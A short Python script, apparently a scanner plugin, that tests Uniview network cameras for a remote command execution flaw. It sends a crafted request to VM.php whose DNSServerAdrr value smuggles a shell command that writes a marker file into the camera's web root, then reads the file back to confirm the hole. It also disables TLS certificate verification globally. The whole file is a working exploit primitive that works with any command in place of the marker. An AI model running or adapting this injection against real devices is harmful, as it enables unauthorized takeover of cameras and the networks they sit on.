# -*- coding:utf-8 -*-

import sys
import re
import requests
import ssl

ssl._create_default_https_context = ssl._create_unverified_context

def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    print('testing if uniview net camera device remote code exec vul')
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    payload = '/Interface/DevManage/VM.php?cmd=setDNSServer&DNSServerAdrr=" |echo "81dc9bdb52d04dc20036dbd8313ed055" >/usr/local/program/ecrwww/apache/htdocs/Interface/DevManage/hit.txt %23"'
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl, headers=headers, timeout=3, verify=False)
        cmdurl = url + "/Interface/DevManage/hit.txt"
        req2 = requests.get(cmdurl, headers=headers, timeout=3, verify=False)
        if r"81dc9bdb52d04dc20036dbd8313ed055" in req2.text:
            msg = 'There is uniview net camera device remote code exec vul on url: ' + cmdurl + ' .'
            number = 'v110'
            return True, url, number, msg
        else:
            pass
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False, url, number, msg
    msg = 'There is no uniview net camera device remote code exec vul'
    number = 'v0'
    return False, url, number, msg

